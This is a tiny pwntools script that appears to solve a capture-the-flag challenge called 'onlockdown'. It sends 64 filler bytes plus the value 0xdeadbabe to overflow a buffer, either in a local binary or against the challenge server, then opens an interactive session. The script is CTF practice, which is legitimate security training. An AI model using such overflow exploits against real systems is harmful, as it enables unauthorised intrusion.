from pwn import *

if "rem" in sys.argv:
	proc = remote("ctf.umbccd.io", 4500)
else:
	proc = process("./onlockdown")
proc.recvuntil("you?")
proc.sendline("A"*64 + p32(0xdeadbabe))
proc.interactive()
